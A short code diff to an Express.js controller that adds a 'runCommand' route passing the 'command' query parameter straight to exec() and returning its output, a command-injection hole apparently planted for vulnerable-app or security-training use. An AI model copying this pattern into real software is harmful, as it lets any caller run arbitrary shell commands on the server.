@@ -36,6 +36,15 @@ exports.index = function (req, res, next) {
     });
 };
 
+exports.runCommand = function (req, res, next) {
+  var userCommand = req.query.command;
+  exec(userCommand, function (err, stdout, stderr) {
+    if (err) {
+      return res.send('Error executing command.');
+    }
+    res.send(stdout);
+  });
+};
 
 exports.admin = function (req, res, next) {
   console.log(req.body);
